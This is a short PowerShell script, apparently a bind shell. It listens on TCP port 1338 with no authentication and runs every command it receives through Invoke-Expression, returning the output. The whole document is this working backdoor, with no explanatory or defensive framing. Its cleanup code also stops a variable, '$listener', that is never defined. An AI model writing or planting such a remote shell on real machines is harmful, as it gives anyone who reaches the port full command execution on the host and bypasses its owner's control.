$ErrorActionPreference = "stop"
try{
    $server = [System.Net.Sockets.TcpListener]::new(1338)
    $server.Start()
    while ($true){
        Write-Host -f cyan "Listening..."
        $client = $server.AcceptTcpClient()
        Write-Host -f green "Connection Established!"
        $stream = $client.GetStream()
        $reader = [System.IO.StreamReader]::new($stream)
        $writer = [System.IO.StreamWriter]::new($stream)
        while ($true){
            if ($reader.Peek()){
                $cmd = $reader.ReadLine()
                $cmdOut = Invoke-Expression -Command $cmd 2>&1 | Out-String
                $writer.WriteLine($cmdOut)
            } else {
                sleep 1
            }
        }
    }
} Finally {
    Try{
    $reader.Dispose()
    $stream.Dispose()
    $client.Dispose()
    $listener.stop()
    } Finally {
        exit
    }
}